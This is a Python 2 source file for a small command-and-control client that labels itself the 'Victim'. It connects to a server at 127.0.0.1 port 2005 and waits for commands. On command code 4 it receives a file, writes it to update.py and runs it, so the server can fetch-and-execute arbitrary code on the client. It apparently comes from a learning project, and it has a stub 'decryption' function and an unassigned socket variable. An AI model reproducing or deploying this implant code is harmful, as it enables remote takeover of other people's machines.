import socket
import subprocess
import os
import select

#SERVER_IP = '127.0.0.1'
SERVER_IP = '127.0.0.1'
SERVER_PORT = 2005
KEY_ENTER = 13
KEY_BACKSPACE = 8
PORT_INDEX = 1
SOCKET_RECV_BYTES = 1024

main_socket = None


def receive_file(params, file="update.py"):
    size_to_read = int(params[0])
    print 'file size = ', size_to_read
    with open(file, 'wb') as f:
        print 'file opened'
        while size_to_read > 0:
            print('receiving data...')
            data = main_socket.recv(SOCKET_RECV_BYTES)
            print 'data=', data
            # write data to a file
            f.write(data)
            size_to_read -= len(data)

        print "done"

def run():
    subprocess.call("python update.py")
    #os.system('python update.py')
    pass

def update_version(params):
    receive_file(params)
    run()

def get_command_id(my_string_msg):
    return int(my_string_msg.split(';')[0])


def get_command_params(my_string_msg):
    return my_string_msg.split(';')[1:]

action_dict = {
    4: update_version
}


def action_to_preform(message):
    action_code = get_command_id(message)
    # action_code = int(message)
    params = get_command_params(message)
    return action_dict[action_code](params)


def decryption(message):
    return message


def manipulate_data(encrypt_message):
    decrypt_message = decryption(encrypt_message)
    return action_to_preform(decrypt_message)


def main():
    try:
        global main_socket
        my_socket = socket.socket()
        my_socket.connect((SERVER_IP, SERVER_PORT))
        socket_messages = []
        print 'Victim is connected to ({}) with port {}'.format(SERVER_IP, my_socket.getsockname()[PORT_INDEX])

        # I'm up
        # my_socket.send("0")
        # print(my_socket.recv(SOCKET_RECV_BYTES))

        while True:
            rlist, wlist, xlist = select.select([my_socket] + socket_messages, [my_socket] + socket_messages, [])
            for sock in rlist:
                if sock is my_socket:
                    msg = my_socket.recv(SOCKET_RECV_BYTES)
                    if not msg and msg == '':
                        sock.close()
                        print 'Connection with server was closed'
                        return
                    else:
                        print msg
                        manipulate_data(msg)

    except Exception as e:
        print 'Exception occurred, value:', e
    finally:
        my_socket.close()
        print 'client connection is closed'


if __name__ == "__main__":
    print "New version 2 !!"
    main()
